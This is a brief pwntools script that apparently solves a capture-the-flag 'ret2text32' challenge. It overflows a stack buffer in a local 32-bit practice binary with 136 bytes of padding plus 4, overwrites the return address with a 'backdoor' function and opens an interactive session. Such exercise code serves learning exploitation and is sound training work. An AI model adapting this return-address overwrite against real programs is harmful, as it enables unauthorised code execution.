from pwn import *

context.arch = "i386"
context.log_level = "debug"

io = process("../attachments/ret2text32")
elf = ELF("../attachments/ret2text32")

payload = flat([cyclic(136), b"A" * 4, elf.sym["backdoor"]])
io.sendlineafter(b"You: ", payload)

io.interactive()
